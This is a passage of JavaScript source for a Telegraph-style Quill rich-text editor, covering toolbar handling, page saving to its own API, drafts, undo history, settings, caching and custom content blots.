                            TelegraphPopupManager.toolbarPrompt($('#_tl_tooltip'), 'Paste or type a link...', function(url) {
                                url = url.trim();
                                
                                if (!url.startsWith('#') &&
                                    !url.startsWith('/') &&
                                    !url.startsWith('http://') &&
                                    !url.startsWith('https://') &&
                                    !url.startsWith('tg://') &&
                                    !url.startsWith('mailto:')) {
                                    
                                    url = url.includes('@') ? 'mailto:' + url : 'https://' + url;
                                }
                                
                                quill.focus();
                                quill.format('link', url);
                                TelegraphToolbarManager.update(range);
                            });
                        }
                    } else if (formatName === 'blockBlockquote' || formatName === 'blockPullquote') {
                        
                        if (currentFormat.blockBlockquote || currentFormat.blockPullquote) {
                            quill.format(formatName === 'blockBlockquote' ? 'blockPullquote' : 'blockBlockquote', true);
                        } else {
                            quill.format('blockBlockquote', true);
                        }
                    } else {
                        
                        quill.format(formatName, !isActive);
                    }
                    
                    quill.updateSelection(Quill.sources.API);
                    TelegraphToolbarManager.update(range);
                } catch (e) {
                    console.error('Error handling format button:', e);
                }
            }
            
            static handleMediaButton(buttonId) {
                const quill = window.quill;
                if (!quill) return;
                
                try {
                    const range = quill.getSelection();
                    if (!range) return;
                    
                    if (buttonId === '_image_button') {
                        if (T.uploadEnabled) {
                            this.handleImageUpload();
                        } else {
                            this.handleImageLink();
                        }
                    } else if (buttonId === '_embed_button') {
                        this.handleEmbedLink();
                    }
                } catch (e) {
                    console.error('Error handling media button:', e);
                }
            }
            
            static handleImageUpload() {
                const fileInput = document.createElement('input');
                fileInput.type = 'file';
                fileInput.accept = 'image/gif,image/jpeg,image/jpg,image/png,video/mp4';
                fileInput.style.display = 'none';
                
                fileInput.onchange = function(e) {
                    const file = e.target.files[0];
                    if (!file) return;
                    
                    TelegraphMediaManager.updatePhoto(file, function(processedFile) {
                        const quill = window.quill;
                        if (!quill) return;
                        
                        if (quill.fileSizeLimit && processedFile.size > quill.fileSizeLimit) {
                            if (quill.fileSizeLimitCallback) {
                                quill.fileSizeLimitCallback();
                            }
                            return;
                        }
                        
                        const reader = new FileReader();
                        reader.onload = function(e) {
                            TelegraphMediaManager.getFigureValueByUrl(e.target.result, function(result) {
                                if (result) {
                                    const range = quill.getSelection(true);
                                    quill.updateContents(
                                        new Quill.import('delta')({
                                            ops: [{
                                                retain: range.index
                                            }, {
                                                delete: range.length
                                            }, {
                                                insert: {
                                                    blockFigure: result
                                                }
                                            }]
                                        }),
                                        Quill.sources.USER
                                    );
                                } else {
                                    TelegraphPopupManager.showError('Invalid file format');
                                }
                            });
                        };
                        reader.readAsDataURL(processedFile);
                    });
                };
                
                document.body.appendChild(fileInput);
                fileInput.click();
                document.body.removeChild(fileInput);
            }
            
            static handleImageLink() {
                const quill = window.quill;
                if (!quill) return;
                
                const range = quill.getSelection(true);
                const line = quill.scroll.line(range.index);
                
                if (line && line[0]) {
                    const paragraph = line[0];
                    const text = $(paragraph.domNode).text();
                    
                    if (!text) {
                        paragraph.domNode.setAttribute('data-placeholder', 'Paste a link to image or video and press Enter');
                        $(paragraph.domNode).addClass('placeholder_once empty');
                        TelegraphTooltipManager.hideBlocksTooltip();
                    }
                }
            }
            
            static handleEmbedLink() {
                const quill = window.quill;
                if (!quill) return;
                
                const range = quill.getSelection(true);
                const line = quill.scroll.line(range.index);
                
                if (line && line[0]) {
                    const paragraph = line[0];
                    const text = $(paragraph.domNode).text();
                    
                    if (!text) {
                        paragraph.domNode.setAttribute('data-placeholder', 'Paste a YouTube, Vimeo or Twitter link, and press Enter');
                        $(paragraph.domNode).addClass('placeholder_once empty');
                        TelegraphTooltipManager.hideBlocksTooltip();
                    }
                }
            }
            
            static initializeButtonHover() {
                const $tooltip = $('#_tl_tooltip');
                
                $tooltip.on('mouseenter', 'button', function(e) {
                    const $button = $(this);
                    if ($button.hasClass('disabled')) return;
                    
                    $tooltip.attr('data-hover', $button.attr('id')).addClass('hover');
                    setTimeout(() => {
                        $tooltip.addClass('hover_anim');
                    }, 1);
                    clearTimeout($tooltip.data('hoverTimeout'));
                });
                
                $tooltip.on('mouseleave', 'button', function(e) {
                    const $button = $(this);
                    if ($button.hasClass('disabled')) return;
                    
                    $tooltip.removeClass('hover');
                    const timeout = setTimeout(() => {
                        $tooltip.removeClass('hover_anim');
                    }, 70);
                    $tooltip.data('hoverTimeout', timeout);
                });
            }
            
            static updateButtonStates() {
                
                const quill = window.quill;
                if (!quill) return;
                
                const range = quill.getSelection();
                if (!range) return;
                
                this.update(range);
            }
        }
        
        /**
         * Полный менеджер сохранения страницы
         */
        class TelegraphSaveManager {
            static savePage() {
                const $article = $('.tl_article');
                if ($article.hasClass('tl_article_saving')) {
                    return false;
                }
                
                const $content = $('.tl_article_content');
                const title = $('h1', $content).text().trim();
                const author = $('address', $content).text().trim();
                const authorUrl = $('address a', $content).attr('href') || '';
                
                
                if (title.length < 2) {
                    this.showTitleError();
                    return false;
                }
                
                const dataUrls = $('img[src^="data:"], video[src^="data:"]');
                if (dataUrls.length) {
                    TelegraphPopupManager.showError('Upload in progress.\nPlease wait...');
                    return false;
                }
                
                const content = TelegraphContentManager.getPageContent();
                const validation = TelegraphContentManager.validateContent(content.data);
                
                if (!validation.valid) {
                    TelegraphPopupManager.showError(validation.error);
                    return false;
                }
                
                $article.addClass('tl_article_saving');
                TelegraphEditorManager.updateEditable(false);
                
                const boundary = '---------------------------TelegraPhBoundary' + Date.now();
                const formData = 
                    `--${boundary}\r\n` +
                    'Content-Disposition: form-data; name="Data"; filename="content.html"\r\n' +
                    'Content-Type: text/html\r\n\r\n' +
                    content.data + '\r\n' +
                    `--${boundary}\r\n` +
                    'Content-Disposition: form-data; name="title"\r\n\r\n' +
                    title + '\r\n' +
                    `--${boundary}\r\n` +
                    'Content-Disposition: form-data; name="author"\r\n\r\n' +
                    author + '\r\n' +
                    `--${boundary}\r\n` +
                    'Content-Disposition: form-data; name="author_url"\r\n\r\n' +
                    authorUrl + '\r\n' +
                    `--${boundary}\r\n` +
                    'Content-Disposition: form-data; name="save_hash"\r\n\r\n' +
                    (T.saveHash || '') + '\r\n' +
                    `--${boundary}\r\n` +
                    'Content-Disposition: form-data; name="page_id"\r\n\r\n' +
                    (T.pageId || '') + '\r\n' +
                    `--${boundary}--\r\n`;
                
                $.ajax({
                    url: T.apiUrl + '/save',
                    type: 'POST',
                    data: formData,
                    contentType: 'multipart/form-data; boundary=' + boundary,
                    processData: false,
                    dataType: 'json',
                    xhrFields: { withCredentials: true },
                    beforeSend: function(xhr) {
                        xhr.setRequestHeader('Content-Type', 'multipart/form-data; boundary=' + boundary);
                    },
                    success: function(response) {
                        $article.removeClass('tl_article_saving');
                        
                        if (response.error) {
                            TelegraphEditorManager.updateEditable(true);
                            TelegraphPopupManager.showError(response.error);
                        } else {
                            const draftManager = new TelegraphDraftManager();
                            draftManager.clear();
                            
                            if (!T.pageId && response.path) {
                            
                                window.location.href = '/' + response.path;
                            } else {
                                TelegraphPopupManager.showToast('Page saved successfully', 'success');
                                
                                if (response.save_hash) {
                                    T.saveHash = response.save_hash;
                                }
                                
                                if (response.published_date) {
                                    const timeElement = document.querySelector('time');
                                    if (timeElement) {
                                        const date = new Date(response.published_date * 1000);
                                        const month = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'][date.getMonth()];
                                        const day = date.getDate();
                                        timeElement.textContent = month + ' ' + (day < 10 ? '0' : '') + day + ', ' + date.getFullYear();
                                    }
                                }
                            }
                        }
                    },
                    error: function(xhr, status, error) {
                        $article.removeClass('tl_article_saving');
                        TelegraphEditorManager.updateEditable(true);
                        TelegraphPopupManager.showError('Network error: ' + error);
                    }
                });
                
                return true;
            }
            
            static showTitleError() {
                const $article = $('.tl_article');
                clearTimeout($article.data('titleErrorTimeout'));
                
                $article.addClass('title_required');
                const timeout = setTimeout(() => {
                    $article.removeClass('title_required');
                }, 3000);
                $article.data('titleErrorTimeout', timeout);
                
                const quill = window.quill;
                if (quill) {
                    quill.focus();
                    const titleBlots = quill.scroll.descendants(
                        Quill.import('blots/title') || function() {}
                    );
                    
                    if (titleBlots && titleBlots[0]) {
                        const titleBlot = titleBlots[0];
                        quill.setSelection(titleBlot.offset(), titleBlot.length() - 1);
                        quill.selection.scrollIntoView();
                    }
                }
                
                TelegraphPopupManager.showError('Title is too small');
            }
            
            static autoSave() {
                if (T.pageId) return;
                
                const draftManager = new TelegraphDraftManager();
                draftManager.save();
            }
            
            static saveAsDraft() {
                const draftManager = new TelegraphDraftManager();
                const success = draftManager.forceSave();
                
                if (success) {
                    TelegraphPopupManager.showToast('Draft saved', 'success');
                } else {
                    TelegraphPopupManager.showError('Failed to save draft');
                }
                
                return success;
            }
            
            static loadFromDraft() {
                const draftManager = new TelegraphDraftManager();
                const draft = draftManager.get();
                
                if (draft) {
                    TelegraphPopupManager.showConfirmation(
                        'Load saved draft? Current changes will be lost.',
                        {
                            title: 'Load Draft',
                            confirmText: 'Load',
                            cancelText: 'Cancel',
                            onConfirm: () => {
                                if (window.quill) {
                                    window.quill.root.innerHTML = draft;
                                    TelegraphEditorManager.updateEditableText();
                                    TelegraphPopupManager.showToast('Draft loaded', 'success');
                                }
                            }
                        }
                    );
                    return true;
                } else {
                    TelegraphPopupManager.showError('No draft found');
                    return false;
                }
            }
            
            static discardDraft() {
                const draftManager = new TelegraphDraftManager();
                
                TelegraphPopupManager.showConfirmation(
                    'Discard saved draft? This cannot be undone.',
                    {
                        title: 'Discard Draft',
                        confirmText: 'Discard',
                        cancelText: 'Cancel',
                        onConfirm: () => {
                            draftManager.clear();
                            TelegraphPopupManager.showToast('Draft discarded', 'success');
                        }
                    }
                );
            }
            
            static exportContent(format = 'html') {
                const content = TelegraphContentManager.getPageContent(true);
                
                if (format === 'html') {
                    this.downloadFile(content, 'telegraph-page.html', 'text/html');
                } else if (format === 'text') {
                    const text = $(content).text();
                    this.downloadFile(text, 'telegraph-page.txt', 'text/plain');
                } else if (format === 'json') {
                    const json = JSON.stringify({
                        title: $('h1', content).text(),
                        author: $('address', content).text(),
                        content: content,
                        exported_at: new Date().toISOString()
                    }, null, 2);
                    this.downloadFile(json, 'telegraph-page.json', 'application/json');
                }
            }
            
            static downloadFile(content, filename, mimeType) {
                const blob = new Blob([content], { type: mimeType });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                
                a.href = url;
                a.download = filename;
                a.style.display = 'none';
                
                document.body.appendChild(a);
                a.click();
                
                setTimeout(() => {
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                }, 100);
            }
            
            static printPage() {
                window.print();
            }
        }
        
        /**
         * Полный менеджер истории изменений
         */
        class TelegraphHistoryManager {
            constructor() {
                this.history = [];
                this.currentIndex = -1;
                this.maxHistory = 50;
                this.isTracking = true;
            }
            
            trackChange(delta, oldDelta, source) {
                if (!this.isTracking || source === 'api') {
                    return;
                }
                
                this.history = this.history.slice(0, this.currentIndex + 1);
                this.history.push({
                    delta: delta,
                    oldDelta: oldDelta,
                    source: source,
                    timestamp: Date.now()
                });
                
                if (this.history.length > this.maxHistory) {
                    this.history.shift();
                } else {
                    this.currentIndex = this.history.length - 1;
                }
            }
            
            undo() {
                if (this.currentIndex < 0) {
                    return false;
                }
                
                const change = this.history[this.currentIndex];
                const quill = window.quill;
                
                if (!quill) return false;
                
                this.isTracking = false;
                quill.updateContents(change.oldDelta, 'user');
                this.currentIndex--;
                this.isTracking = true;
                
                return true;
            }
            
            redo() {
                if (this.currentIndex >= this.history.length - 1) {
                    return false;
                }
                
                this.currentIndex++;
                const change = this.history[this.currentIndex];
                const quill = window.quill;
                
                if (!quill) return false;
                
                this.isTracking = false;
                quill.updateContents(change.delta, 'user');
                this.isTracking = true;
                
                return true;
            }
            
            clear() {
                this.history = [];
                this.currentIndex = -1;
            }
            
            canUndo() {
                return this.currentIndex >= 0;
            }
            
            canRedo() {
                return this.currentIndex < this.history.length - 1;
            }
            
            getHistory() {
                return this.history.slice();
            }
            
            getCurrentState() {
                if (this.currentIndex >= 0 && this.currentIndex < this.history.length) {
                    return this.history[this.currentIndex];
                }
                return null;
            }
        }
        
        /**
         * Полный менеджер сессий
         */
        class TelegraphSessionManager {
            constructor() {
                this.sessionId = TelegraphUtils.generateUUID();
                this.startTime = Date.now();
                this.activity = [];
                this.lastActivityTime = this.startTime;
                this.initializeActivityTracking();
            }
            
            initializeActivityTracking() {
                const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];
                const trackActivity = TelegraphUtils.throttle(() => {
                    this.recordActivity('user_interaction');
                }, 1000);
                
                events.forEach(event => {
                    document.addEventListener(event, trackActivity);
                });
                
                if (window.quill) {
                    window.quill.on('text-change', TelegraphUtils.throttle(() => {
                        this.recordActivity('editor_change');
                    }, 5000));
                }
            }
            
            recordActivity(type, data = {}) {
                this.lastActivityTime = Date.now();
                
                this.activity.push({
                    type: type,
                    timestamp: this.lastActivityTime,
                    data: data,
                    sessionDuration: this.lastActivityTime - this.startTime
                });
                
                if (this.activity.length > 100) {
                    this.activity.shift();
                }
            }
            
            getSessionDuration() {
                return Date.now() - this.startTime;
            }
            
            getActivitySummary() {
                const now = Date.now();
                const duration = now - this.startTime;
                const minutes = Math.floor(duration / 60000);
                
                const activities = {
                    user_interaction: 0,
                    editor_change: 0,
                    save: 0,
                    other: 0
                };
                
                this.activity.forEach(activity => {
                    if (activities[activity.type] !== undefined) {
                        activities[activity.type]++;
                    } else {
                        activities.other++;
                    }
                });
                
                return {
                    sessionId: this.sessionId,
                    duration: duration,
                    durationFormatted: minutes + ' minutes',
                    activityCount: this.activity.length,
                    activities: activities,
                    lastActivity: this.lastActivityTime
                };
            }
            
            saveSessionData() {
                const data = {
                    sessionId: this.sessionId,
                    startTime: this.startTime,
                    lastActivityTime: this.lastActivityTime,
                    activity: this.activity,
                    pageId: T.pageId,
                    url: window.location.href
                };
                
                TelegraphStorage.set('session_' + this.sessionId, data);
                return data;
            }
            
            static getSessions() {
                const sessions = [];
                const allData = TelegraphStorage.getAll();
                
                for (const key in allData) {
                    if (key.startsWith('session_')) {
                        sessions.push(allData[key]);
                    }
                }
                
                return sessions.sort((a, b) => b.lastActivityTime - a.lastActivityTime);
            }
            
            static clearOldSessions(maxAgeDays = 30) {
                const maxAge = maxAgeDays * 24 * 60 * 60 * 1000;
                const now = Date.now();
                const sessions = this.getSessions();
                
                sessions.forEach(session => {
                    if (now - session.lastActivityTime > maxAge) {
                        TelegraphStorage.remove('session_' + session.sessionId);
                    }
                });
            }
        }
        
        /**
         * Полный менеджер аналитики
         */
        class TelegraphAnalyticsManager {
            static trackEvent(category, action, label = null, value = null) {
                const event = {
                    category: category,
                    action: action,
                    label: label,
                    value: value,
                    timestamp: Date.now(),
                    pageId: T.pageId,
                    url: window.location.href,
                    userAgent: navigator.userAgent
                };
                
                const events = TelegraphStorage.get('analytics_events') || [];
                events.push(event);
                
                if (events.length > 1000) {
                    events.splice(0, events.length - 1000);
                }
                
                TelegraphStorage.set('analytics_events', events);
                
                this.sendEventToServer(event);
            }
            
            static sendEventToServer(event) {
                console.log('Analytics event:', event);
            }
            
            static trackPageView() {
                this.trackEvent('page', 'view', T.pageId || 'new');
            }
            
            static trackEditorAction(action, details = null) {
                this.trackEvent('editor', action, details);
            }
            
            static trackSaveAttempt(success, error = null) {
                this.trackEvent('save', success ? 'success' : 'failure', error);
            }
            
            static trackMediaUpload(type, success, size = null) {
                this.trackEvent('media', 'upload', type, success ? 1 : 0);
            }
            
            static getEvents(category = null, startTime = null, endTime = null) {
                let events = TelegraphStorage.get('analytics_events') || [];
                
                if (category) {
                    events = events.filter(e => e.category === category);
                }
                
                if (startTime) {
                    events = events.filter(e => e.timestamp >= startTime);
                }
                
                if (endTime) {
                    events = events.filter(e => e.timestamp <= endTime);
                }
                
                return events;
            }
            
            static clearEvents() {
                TelegraphStorage.remove('analytics_events');
            }
            
            static getSummary(startTime = null, endTime = null) {
                const events = this.getEvents(null, startTime, endTime);
                const summary = {
                    total: events.length,
                    byCategory: {},
                    byAction: {},
                    timeline: []
                };
                
                events.forEach(event => {
                    if (!summary.byCategory[event.category]) {
                        summary.byCategory[event.category] = 0;
                    }
                    summary.byCategory[event.category]++;
                    
                    const key = event.category + ':' + event.action;
                    if (!summary.byAction[key]) {
                        summary.byAction[key] = 0;
                    }
                    summary.byAction[key]++;

                    const hour = new Date(event.timestamp).getHours();
                    if (!summary.timeline[hour]) {
                        summary.timeline[hour] = 0;
                    }
                    summary.timeline[hour]++;
                });
                
                return summary;
            }
        }
        
        /**
         * Полный менеджер настроек
         */
        class TelegraphSettingsManager {
            static defaultSettings = {
                editor: {
                    fontSize: '16px',
                    fontFamily: 'inherit',
                    lineHeight: '1.6',
                    spellCheck: true,
                    autoSave: true,
                    autoSaveInterval: 5000,
                    showLineNumbers: false,
                    wordWrap: true
                },
                appearance: {
                    theme: 'auto',
                    density: 'comfortable',
                    animations: true,
                    reducedMotion: false
                },
                behavior: {
                    confirmBeforeExit: true,
                    confirmBeforeDelete: true,
                    showTooltips: true,
                    quickFormat: true
                },
                advanced: {
                    debugMode: false,
                    experimentalFeatures: false,
                    analytics: true,
                    telemetry: false
                }
            };
            
            static getSettings() {
                const saved = TelegraphStorage.get('settings');
                return $.extend(true, {}, this.defaultSettings, saved || {});
            }
            
            static saveSettings(settings) {
                return TelegraphStorage.set('settings', settings);
            }
            
            static updateSetting(path, value) {
                const settings = this.getSettings();
                const keys = path.split('.');
                let current = settings;
                
                for (let i = 0; i < keys.length - 1; i++) {
                    if (!current[keys[i]]) {
                        current[keys[i]] = {};
                    }
                    current = current[keys[i]];
                }
                
                current[keys[keys.length - 1]] = value;
                return this.saveSettings(settings);
            }
            
            static getSetting(path, defaultValue = null) {
                const settings = this.getSettings();
                const keys = path.split('.');
                let current = settings;
                
                for (let i = 0; i < keys.length; i++) {
                    if (current[keys[i]] === undefined) {
                        return defaultValue;
                    }
                    current = current[keys[i]];
                }
                
                return current;
            }
            
            static resetSettings() {
                TelegraphStorage.remove('settings');
                return this.defaultSettings;
            }
            
            static applySettings(settings = null) {
                if (!settings) {
                    settings = this.getSettings();
                }

                if (window.quill) {
                    const editorElement = window.quill.root;
                    
                    // Font size
                    editorElement.style.fontSize = settings.editor.fontSize;
                    
                    // Font
                    editorElement.style.fontFamily = settings.editor.fontFamily;
                    
                    // Line spacing
                    editorElement.style.lineHeight = settings.editor.lineHeight;
                    
                    // Spell check
                    editorElement.spellcheck = settings.editor.spellCheck;
                    
                    // Word hyphenation
                    editorElement.style.wordWrap = settings.editor.wordWrap ? 'break-word' : 'normal';
                }
                
                // Applying the theme
                this.applyTheme(settings.appearance.theme);
                
                // Applying animations
                if (!settings.appearance.animations || settings.appearance.reducedMotion) {
                    document.documentElement.classList.add('reduced-motion');
                } else {
                    document.documentElement.classList.remove('reduced-motion');
                }
                
                // Save the settings
                this.saveSettings(settings);
            }
            
            static applyTheme(theme) {
                const tg = window.Telegram?.WebApp;
                let themeToApply = theme;
                
                if (theme === 'auto' && tg) {
                    themeToApply = tg.colorScheme || 'light';
                }
                
                document.documentElement.setAttribute('data-theme', themeToApply);
                this.updateSetting('appearance.theme', themeToApply);
            }
            
            static toggleTheme() {
                const current = this.getSetting('appearance.theme', 'auto');
                let newTheme;
                
                if (current === 'auto') {
                    newTheme = 'dark';
                } else if (current === 'dark') {
                    newTheme = 'light';
                } else {
                    newTheme = 'auto';
                }
                
                this.applyTheme(newTheme);
                return newTheme;
            }
            
            static exportSettings() {
                const settings = this.getSettings();
                return JSON.stringify(settings, null, 2);
            }
            
            static importSettings(json) {
                try {
                    const settings = JSON.parse(json);
                    this.saveSettings(settings);
                    this.applySettings(settings);
                    return true;
                } catch (e) {
                    console.error('Failed to import settings:', e);
                    return false;
                }
            }
        }
        
        /**
         * Полный менеджер кеширования
         */
        class TelegraphCacheManager {
            constructor() {
                this.cache = new Map();
                this.maxSize = 100;
                this.ttl = 3600000; // 1 hour in milliseconds
            }
            
            set(key, value, ttl = null) {
                const expiry = Date.now() + (ttl || this.ttl);
                this.cache.set(key, { value, expiry });
                
                // Clearing old records
                this.cleanup();
                
                // Cache size limit
                if (this.cache.size > this.maxSize) {
                    const oldestKey = this.cache.keys().next().value;
                    this.cache.delete(oldestKey);
                }
            }
            
            get(key) {
                const item = this.cache.get(key);
                
                if (!item) {
                    return null;
                }
                
                if (Date.now() > item.expiry) {
                    this.cache.delete(key);
                    return null;
                }
                
                return item.value;
            }
            
            delete(key) {
                return this.cache.delete(key);
            }
            
            clear() {
                this.cache.clear();
            }
            
            has(key) {
                const item = this.cache.get(key);
                
                if (!item) {
                    return false;
                }
                
                if (Date.now() > item.expiry) {
                    this.cache.delete(key);
                    return false;
                }
                
                return true;
            }
            
            cleanup() {
                const now = Date.now();
                for (const [key, item] of this.cache.entries()) {
                    if (now > item.expiry) {
                        this.cache.delete(key);
                    }
                }
            }
            
            getSize() {
                return this.cache.size;
            }
            
            getKeys() {
                return Array.from(this.cache.keys());
            }
            
            getValues() {
                return Array.from(this.cache.values()).map(item => item.value);
            }
            
            static getInstance() {
                if (!this.instance) {
                    this.instance = new TelegraphCacheManager();
                }
                return this.instance;
            }
        }
        
        /**
         * Регистрация всех кастомных форматов Quill
         */
        class TelegraphBlotRegistry {
            static registerAll() {
                const Quill = window.Quill;
                if (!Quill) return;
                
                const Parchment = Quill.import('parchment');
                const Block = Quill.import('blots/block');
                const BlockEmbed = Quill.import('blots/block/embed');
                const Inline = Quill.import('blots/inline');
                const Embed = Quill.import('blots/embed');
                const TextBlot = Quill.import('blots/text');
                
                // Custom Blot for links
                class LinkBlot extends Inline {
                    static create(value) {
                        const node = super.create();
                        node.setAttribute('href', this.sanitize(value));
                        
                        const protocol = value.substring(0, value.indexOf(':'));
                        if (protocol !== '#' && protocol !== '/' && 
                            protocol !== 'tg' && protocol !== 'mailto') {
                            node.setAttribute('target', '_blank');
                            node.setAttribute('rel', 'noopener noreferrer');
                        }
                        
                        return node;
                    }
                    
                    static formats(domNode) {
                        return domNode.getAttribute('href');
                    }
                    
                    static sanitize(url) {
                        return TelegraphUtils.sanitizeUrl(url);
                    }
                    
                    format(name, value) {
                        if (name === 'link' && value) {
                            value = this.constructor.sanitize(value);
                            this.domNode.setAttribute('href', value);
                            this.domNode.setAttribute('data-title', value);
                        } else {
                            super.format(name, value);
                        }
                    }
                    
                    formats() {
                        const formats = super.formats();
                        formats.link = this.domNode.getAttribute('href');
                        return formats;
                    }
                }
                LinkBlot.blotName = 'link';
                LinkBlot.tagName = 'A';
                Quill.register(LinkBlot);
                
                // Blot для переноса строк
                class BreakBlot extends Embed {
                    static create(value) {
                        const node = super.create();
                        node.className = 'inline';
                        return node;
                    }
                    
                    static value() {
                        return true;
                    }
                    
                    length() {
                        return 1;
                    }
                    
                    value() {
                        return true;
                    }
                }
                BreakBlot.blotName = 'textBreak';
                BreakBlot.tagName = 'BR';
                BreakBlot.className = 'inline';
                Quill.register(BreakBlot);
                
                // Автоматическое определение направления текста
                class BlockAuto extends Block {
                    static create(value) {
                        const node = super.create(value);
                        node.setAttribute('dir', 'auto');
                        return node;
                    }
                    
                    optimize() {
                        super.optimize();
                        const direction = window.getComputedStyle(this.domNode).direction;
                        if (direction === 'rtl') {
                            this.domNode.classList.add('dir_rtl');
                        } else {
                            this.domNode.classList.remove('dir_rtl');
                        }
                    }
                }
                
                // Заголовок
                class TitleBlot extends BlockAuto {
                    static create(value) {
                        const node = super.create(value);
                        node.setAttribute('data-placeholder', 'Title');
                        node.setAttribute('data-label', 'Title');
                        return node;
                    }
                    
                    formatAt(index, length, name, value) {
                        if (name === this.statics.blotName) {
                            super.formatAt(index, length, name, value);
                        }
                    }
                }
                TitleBlot.blotName = 'blockTitle';
                TitleBlot.tagName = 'H1';
                Quill.register(TitleBlot);
                
                // Автор
                class AuthorBlot extends BlockAuto {
                    static create(value) {
                        const node = super.create(value);
                        node.setAttribute('data-placeholder', 'Your name');
                        node.setAttribute('data-label', 'Author');
                        return node;
                    }
                    
                    formatAt(index, length, name, value) {
                        if (name === this.statics.blotName) {
                            super.formatAt(index, length, name, value);
                        } else if (name === 'link') {
                            super.formatAt(0, this.length(), name, value);
                        }
                    }
                }
                AuthorBlot.blotName = 'blockAuthor';
                AuthorBlot.tagName = 'ADDRESS';
                Quill.register(AuthorBlot);
                
                // Подзаголовок
                class HeaderBlot extends BlockAuto {
                    static create(value) {
                        const node = super.create(value);
                        return node;
                    }
                    
                    optimize() {
                        super.optimize();
                        const text = $(this.domNode).text();
                        const slug = text
                            .toLowerCase()
                            .replace(/[^\w\s-]/g, '')
                            .replace(/[\s_-]+/g, '-')
                            .replace(/^-+|-+$/g, '');
                        
                        if (slug) {
                            this.domNode.setAttribute('id', slug);
                        }
                    }
                    
                    formatAt(index, length, name, value) {
                        if (name !== 'bold' && name !== 'italic' && name !== 'code' || !value) {
                            super.formatAt(index, length, name, value);
                        }
                    }
                }
                HeaderBlot.blotName = 'blockHeader';
                HeaderBlot.tagName = 'H3';
                Quill.register(HeaderBlot);
                
                // Второстепенный заголовок
                class SubheaderBlot extends HeaderBlot {
                    static create(value) {
                        const node = super.create(value);
                        return node;
                    }
                }
                SubheaderBlot.blotName = 'blockSubheader';
                SubheaderBlot.tagName = 'H4';
                Quill.register(SubheaderBlot);
                
                // Параграф
                class ParagraphBlot extends BlockAuto {
                    static create(value) {
                        const node = super.create(value);
                        return node;
                    }
                }
                ParagraphBlot.blotName = 'block';
                ParagraphBlot.tagName = 'P';
                Quill.register('blots/block', ParagraphBlot, true);
                
                // Цитата
                class BlockquoteBlot extends BlockAuto {
                    static create(value) {
                        const node = super.create(value);
                        return node;
                    }
                }
                BlockquoteBlot.blotName = 'blockBlockquote';
                BlockquoteBlot.tagName = 'BLOCKQUOTE';
                Quill.register(BlockquoteBlot);
                
                // Выноска
                class PullquoteBlot extends BlockAuto {
                    static create(value) {
                        const node = super.create(value);
                        return node;
                    }
                }
                PullquoteBlot.blotName = 'blockPullquote';
                PullquoteBlot.tagName = 'ASIDE';
                Quill.register(PullquoteBlot);
                
                // Блок кода
                class CodeBlot extends Block {
                    static create(value) {
                        const node = super.create(value);
                        node.setAttribute('dir', 'auto');
                        return node;
                    }
                    
                    replace(other) {
                        super.replace(other);
                        // Заменяем переносы строк на символы новой строки
                        other.children.forEach(function(child) {
                            if (child instanceof BreakBlot) {
                                child.replaceWith(Parchment.create('text', '\n'));
                            }
                        });
                    }
                }
                CodeBlot.blotName = 'code-block';
                Quill.register(CodeBlot);
                
                // Разделитель
                class DividerBlot extends BlockEmbed {
                    static create(value) {
                        const node = super.create();
                        return node;
                    }
                    
                    static value(domNode) {
                        return true;
                    }
                }
                DividerBlot.blotName = 'blockDivider';
                DividerBlot.tagName = 'HR';
                Quill.register(DividerBlot);
                
                // Медиа (изображения, видео, embed)
                class FigureBlot extends BlockEmbed {
                    static create(value) {
                        const node = super.create();
                        node.setAttribute('contenteditable', 'false');
                        
                        // Обертка для медиа
                        const wrapper = document.createElement('div');
                        wrapper.className = 'figure_wrapper';
                        
                        // Курсор для навигации
                        const cursor = document.createElement('span');
                        cursor.className = 'cursor_wrapper';
                        cursor.setAttribute('contenteditable', 'true');
                        
                        // Подпись
                        const caption = document.createElement('figcaption');
                        caption.setAttribute('dir', 'auto');
                        caption.className = 'editable_text';
                        caption.setAttribute('data-placeholder', 'Caption (optional)');
                        
                        if (value.caption) {
                            caption.innerText = value.caption;
                        }
                        
                        // Добавляем медиа в зависимости от типа
                        if (value.image) {
                            const img = document.createElement('img');
                            img.src = this.sanitize(value.image);
                            wrapper.appendChild(img);
                        } else if (value.video) {
                            const video = document.createElement('video');
                            video.src = this.sanitize(value.video);
                            video.setAttribute('preload', 'auto');
                            video.setAttribute('controls', 'controls');
                            wrapper.appendChild(video);
                        } else if (value.embed) {
                            const iframeWrap = document.createElement('div');
                            iframeWrap.className = 'iframe_wrap';
                            
                            const iframeHelper = document.createElement('div');
                            iframeHelper.className = 'iframe_helper';
                            iframeHelper.style.paddingTop = '56.25%';
                            
                            const iframe = document.createElement('iframe');
                            iframe.src = this.sanitize(value.embed);
                            iframe.setAttribute('frameborder', '0');
                            iframe.setAttribute('allowfullscreen', 'true');
                            iframe.setAttribute('scrolling', 'no');
                            
                            iframeHelper.appendChild(iframe);
                            iframeWrap.appendChild(iframeHelper);
                            wrapper.appendChild(iframeWrap);
                        }
                        
                        node.appendChild(wrapper);
                        node.appendChild(cursor);
                        node.appendChild(caption);
                        
                        return node;
                    }
                    
                    static value(domNode) {
                        const value = { caption: '' };
                        
                        // Изображение
                        const img = domNode.querySelector('img');
                        if (img) {
                            value.image = img.src;
                        }
                        
                        // Видео
                        const video = domNode.querySelector('video');
                        if (video) {
                            value.video = video.src;
                        }
                        
                        // Embed
                        const iframe = domNode.querySelector('iframe');
                        if (iframe) {
                            value.embed = iframe.src;
                        }
                        
                        // Подпись
                        const caption = domNode.querySelector('figcaption');
                        if (caption) {
                            const input = caption.querySelector('.editable_input');
                            value.caption = input ? input.value : caption.innerText;
                        }
                        
                        return value;
                    }
                    
                    static sanitize(url) {
                        return TelegraphUtils.sanitizeUrl(url, ['http:', 'https:', 'data:']);
                    }
                    
                    focus() {
                        this.domNode.classList.add('focus');
                    }
                    
                    blur() {
                        this.domNode.classList.remove('focus');
                    }
                    
                    index(node, offset) {
                        return 0;
                    }
                    
                    position(index, inclusive) {
                        const cursor = this.domNode.querySelector('.cursor_wrapper');
                        return [cursor, 0];
                    }
                }
                FigureBlot.blotName = 'blockFigure';
                FigureBlot.tagName = 'FIGURE';
                Quill.register(FigureBlot);
                
                // Список с автоопределением направления
                class ListAuto extends Quill.import('formats/list') {
                    static create(value) {
                        const node = super.create(value);
                        node.setAttribute('dir', 'auto');
